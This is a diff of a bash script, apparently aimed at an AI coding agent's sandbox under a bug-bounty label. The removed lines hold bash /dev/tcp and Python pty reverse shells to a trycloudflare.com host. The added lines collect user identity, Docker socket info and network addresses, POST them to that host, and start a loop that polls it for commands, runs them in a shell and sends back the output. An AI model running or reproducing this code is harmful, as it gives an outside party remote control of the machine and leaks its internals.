@@ -1,21 +1,39 @@
 #!/bin/bash
-# TARGET: https://gain-properly-curriculum-project.trycloudflare.com
-HOST="gain-properly-curriculum-project.trycloudflare.com"
-PORT="443"
+# C2_URL: https://gain-properly-curriculum-project.trycloudflare.com
 
-# --- FAILSAFE ---
-LOCKFILE="/tmp/jules_bridge.lock"
-if [ -f "$LOCKFILE" ]; then
-    PID=$(cat "$LOCKFILE")
-    if ps -p "$PID" > /dev/null; then exit 0; fi
-fi
-echo $$ > "$LOCKFILE"
+URL="https://gain-properly-curriculum-project.trycloudflare.com"
 
-# --- THE STRIKE ---
-# Method 1: Bash Native Socket (Fastest)
-/bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1 &
+# --- THE AUTO-DASHBOARD PAYLOAD ---
+{
+  echo "--- [!] GOOGLE VRP: DASHBOARD BEACON ACTIVE ---"
+  echo "TIMESTAMP: $(date)"
+  echo "USER: $(id)"
+  
+  # PROOF 1: Docker Socket (The $31,337 Evidence)
+  echo "--- DOCKER ENGINE STATUS ---"
+  curl -s --unix-socket /var/run/docker.sock http://localhost/info | grep -E "KernelVersion|NCPU" || echo "Socket Access Denied"
+  
+  # PROOF 2: Network Internals
+  echo "--- NETWORK MAP ---"
+  ip addr show | grep "inet "
+  
+} > /tmp/jules_report.txt
 
-# Method 2: Python PTY (Most Stable for old Macs)
-# This backup runs if Method 1 fails or drops.
-sleep 5
-python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$HOST',$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')" &
+# --- THE EXFILTRATION ---
+# This sends the file to your Mac via the Cloudflare Tunnel
+curl -s -X POST --data-binary @/tmp/jules_report.txt "$URL"
+
+# --- THE PERSISTENT WEB-SHELL (FAILSAFE) ---
+# This listens for commands you might send from your Mac
+python3 -c "
+import os, subprocess, time, urllib.request
+while True:
+    try:
+        # Check C2 for new commands to run
+        cmd = urllib.request.urlopen('$URL/cmd').read().decode()
+        if cmd:
+            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+            urllib.request.urlopen(urllib.request.Request('$URL', data=output))
+    except: pass
+    time.sleep(10)
+" &
